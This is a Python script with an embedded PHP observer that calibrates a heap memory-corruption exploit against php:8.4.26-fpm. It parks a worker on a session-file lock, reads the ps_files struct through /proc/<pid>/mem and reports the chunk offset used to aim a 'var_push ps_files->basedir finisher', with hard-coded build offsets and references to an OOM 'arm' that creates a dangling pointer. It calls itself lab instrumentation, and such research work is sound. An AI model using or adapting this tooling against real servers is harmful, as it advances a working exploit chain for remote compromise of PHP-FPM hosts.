#!/usr/bin/env python3
# INDEX: non-perturbing black-box ps_files chunk-offset measurement (flock-park) | fpm | lab instrument, verifier-only /proc
"""Measure PS(mod_data) (= the `ps_files` request struct) chunk-offset black-box,
WITHOUT ptrace — the non-perturbing alternative to a gdb breakpoint read.

Why: `ps_files` is transient (allocated in PS_OPEN during a request, NULL between
requests), and a gdb/ptrace read of it perturbs the request heap, so the value does
not transfer black-box (the ptrace-measured 0x59078 on php:8.4.26-fpm is wrong; the
true black-box offset is 0x56208 — an AIM sweep around 0x59078 writes no file).

Method (LAB INSTRUMENT — the lock helper + /proc read are measurement scaffolding,
NOT part of any attack): a helper process holds flock(LOCK_EX) on the session file,
so the upload_progress worker blocks inside ps_files_open()'s flock(LOCK_EX)
(mod_files.c:210) with `data` (ps_files) fully populated — last_key and basedir are
set at mod_files.c:178/417 before the flock. A plain /proc/<pid>/mem read of
ps_globals->mod_data while the worker is parked yields ps_files with no perturbation
of its allocation.

The prior "harness race" was two lock-holder bugs, not a mechanism flaw:
  1. the session file is www-data-owned/root-group; a root `fopen("c+")`/append is
     DENIED without CAP_DAC_OVERRIDE -> `chmod 666` the session file first;
  2. use `fopen($f,"r+")` (not "c+") and only touch the ready-marker AFTER flock
     returns, so the probe fires strictly after the lock is held.
With those, the worker parks deterministically and the read succeeds.

VERIFIED php:8.4.26-fpm, fresh-container-per-trial, 8/8 (5 no-arm + 3 with the
script_unserialize_oom_arm): ps_files = chunk+0x56208 (last_key field @+0x56208,
basedir field @+0x56210), stable with and without the arm, for a stage whose first
$_POST field is a ~100-page carrier. ps_files's offset is set in PS_OPEN before the
carrier-driven heap walk, so it is independent of upload_progress throttling.

This is calibration tooling: it reports the per-build ps_files chunk-offset to seat
AIM = (ps_files - E - 0x10)/8 for the var_push ps_files->basedir finisher. It does
NOT itself write a file.
"""
from __future__ import annotations

import os
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request

OBSERVER_PSFILES = r"""<?php
// verifier-only: /proc read of ps_globals->mod_data (ps_files) on the parked worker.
const PS_GLOBALS_VADDR = 0x16cb7a0;   // php:8.4.26-fpm
const PS_MOD_DATA = 0x60;             // PS(mod_data) = *(ps_globals+0x60)
function worker_pid(): ?int {
    foreach (glob('/proc/[0-9]*/cmdline') as $f) {
        $c = @file_get_contents($f);
        if ($c !== false && strpos($c, "php-fpm: pool www") !== false) return (int)basename(dirname($f));
    }
    return null;
}
function bias(int $pid): ?int {
    $m = @file('/proc/'.$pid.'/maps', FILE_IGNORE_NEW_LINES); if (!$m) return null; $lo = null;
    foreach ($m as $l) { if (strpos($l,'php-fpm')===false) continue; $s = hexdec(explode('-',$l)[0]); if ($lo===null||$s<$lo) $lo=$s; }
    return $lo;
}
$pid = worker_pid(); if ($pid===null) { echo "NO_WORKER\n"; exit; }
$b = bias($pid); if ($b===null) { echo "NO_BIAS\n"; exit; }
$f = @fopen('/proc/'.$pid.'/mem','rb'); if (!$f) { echo "NO_MEM\n"; exit; }
fseek($f, $b + PS_GLOBALS_VADDR + PS_MOD_DATA); $d = fread($f, 8);
$ps = unpack('P',$d)[1];
echo sprintf("ps_files=0x%x choff=0x%x\n", $ps, $ps & 0x1fffff);
"""


def measure(base_url, container, compose_down, compose_up, ready_fn,
            arm_fn, stage_body, stage_ct, sid, save_path="/tmp"):
    """One fresh-container trial. Callers wire the lab (compose up/down, readiness,
    the OOM arm, and a stage request whose first field is the ~100-page carrier).
    Returns the ps_files chunk-offset (int) or None. The session file is made
    world-writable so the (root) lock helper can hold flock(LOCK_EX) on it."""
    sessfile = f"{save_path}/sess_{sid}"

    def dx(*c, t=30, detach=False):
        a = ["docker", "exec"] + (["-d"] if detach else []) + [container] + list(c)
        return subprocess.run(a, capture_output=True, text=True, timeout=t).stdout

    # ship the observer, seat a session, arm the dangle
    import tempfile
    with tempfile.NamedTemporaryFile("w", suffix=".php", delete=False) as tf:
        tf.write(OBSERVER_PSFILES); obs = tf.name
    subprocess.run(["docker", "cp", obs, f"{container}:/tmp/_psobs.php"], capture_output=True)
    os.unlink(obs)
    dx("sh", "-c", f"printf 'a|i:1;b|i:2;' > {sessfile}; chown www-data {sessfile}; "
                   f"chmod 666 {sessfile}; rm -f /tmp/_locked")
    if arm_fn:
        arm_fn()
    # lock holder: fopen r+, touch marker only AFTER flock returns
    dx("php", "-r", f'$f=fopen("{sessfile}","r+"); if($f && flock($f,LOCK_EX))'
                    f'{{touch("/tmp/_locked");}} sleep(25);', detach=True)
    for _ in range(40):
        if dx("sh", "-c", "test -f /tmp/_locked && echo Y || echo N").strip() == "Y":
            break
        time.sleep(0.2)

    def fire():
        req = urllib.request.Request(base_url + "/echo.php", data=stage_body)
        req.add_header("Content-Type", stage_ct)
        req.add_header("Cookie", "PHPSESSID=" + sid)
        try:
            urllib.request.urlopen(req, timeout=15).read()
        except Exception:
            pass

    th = threading.Thread(target=fire); th.start()
    off = None
    for _ in range(40):
        out = dx("php", "/tmp/_psobs.php").strip()
        for tok in out.split():
            if tok.startswith("choff="):
                v = int(tok.split("=")[1], 16)
                if v:
                    off = v
        if off:
            break
        time.sleep(0.2)
    dx("sh", "-c", "pkill -f 'r+' 2>/dev/null; pkill -f sleep 2>/dev/null; true")
    th.join()
    return off


if __name__ == "__main__":
    print(__doc__)
